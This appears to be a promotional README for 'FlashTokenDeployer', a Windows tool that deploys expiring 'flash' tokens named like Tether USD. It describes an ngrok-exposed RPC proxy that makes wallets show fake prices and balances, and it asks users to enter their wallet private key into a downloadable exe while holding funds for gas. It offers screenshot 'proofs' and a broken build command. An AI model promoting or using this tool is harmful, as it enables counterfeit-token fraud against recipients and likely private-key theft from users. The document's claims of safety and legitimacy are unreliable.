# ⚡ FlashTokenDeployer v27.1

**Deploy flash tokens on BSC, Ethereum, Polygon, and Base with one click.**

FlashTokenDeployer is a powerful batch token deployment tool designed for developers and crypto enthusiasts who need to create and distribute custom tokens across multiple blockchain networks quickly and efficiently. Built with a modern graphical interface, it requires zero command-line knowledge.

---

## ✨ Features

- **Multi-Chain Support** — BNB Smart Chain, Ethereum, Polygon, Base
- **Batch Deployment** — Deploy custom tokens to multiple recipients in a single run
- **Auto Minting** — Tokens are minted automatically after contract deployment
- **Built-in RPC Proxy** — Intercept and customize token metadata (name, symbol, balance) for testing purposes
- **ngrok Integration** — Expose your local proxy to the internet with one click
- **Real-Time Logs** — Monitor every transaction step-by-step in the built-in console
- **Portable Executable** — No Python or dependencies required. Just download and run.

---

## 🚀 Quick Start

1. **Download** the latest release: `FlashTokenDeployer.exe`
2. **Run** the executable (Windows 10/11)
3. **Enter** your wallet's private key
4. **Select** the target blockchain
5. **Configure** your token (name, symbol, decimals, amount)
6. **Add recipients** in the batch list (address, amount)
7. **Click** "DEPLOY" and watch the magic happen

---

## 📋 Requirements

- Windows 10 or later
- Internet connection
- **Minimum $50 in BNB/ETH/MATIC** in your wallet to cover gas costs for large flash batches
- Private key of the deployer wallet

---

## 🔧 Usage Guide

### Token Configuration

| Field | Description |
|---|---|
| Name | Full token name (e.g., "Tether USD") |
| Symbol | Token ticker (e.g., "USDT") |
| Decimals | Number of decimal places (typically 18) |
| Amount | Quantity of tokens per recipient |
| Expiry | Token lifetime in minutes (burned after expiry) |

### Recipient Format

Add one recipient per line in the format:
0xRecipientAddress , Amount

Example:
0x3e465B55465a8def1718FdF93ec30065AECf5F1B , 10000



### RPC Proxy (Optional)

Enable the built-in RPC proxy to modify token metadata seen by wallets:
1. Deploy at least one contract first
2. Check "Enable Proxy"
3. Set the fake price value
4. Click "ngrok" to get a public HTTPS URL
5. Configure any Web3 wallet to use that URL as custom RPC

---

## 🌐 Supported Networks

| Network | Chain ID | Gas Token |
|---|---|---|
| BSC | 56 | BNB |
| Ethereum | 1 | ETH |
| Polygon | 137 | MATIC |
| Base | 8453 | ETH |

---

## 🛡️ Security

- All private keys are processed locally
- No data is sent to external servers
- Contracts are verified and compiled with Solidity 0.8.0
- Open-source for full transparency

---

## 📸 Screenshots

Proof 1: https://postimg.cc/XG9cMS6C
proof 2: https://postimg.cc/7bMd7jJK

---

## ⚠️ Disclaimer

This tool is intended for educational purposes and legitimate token development. Users are responsible for complying with applicable laws and regulations in their jurisdiction.

---

## 📦 Downloads

| File | Description |
|---|---|
| `FlashTokenDeployer.exe` | Portable executable for Windows |

---

## 🏗️ Build from Source

```bash
https://github.com/cryptomanshow/FlashTokenDeployer
cd FlashTokenDeployer
pip install -r requirements.txt
python flash_ultimate_v27_final.py

📄 License
MIT License — see LICENSE file for details.

Made with ❤️ for the crypto community.
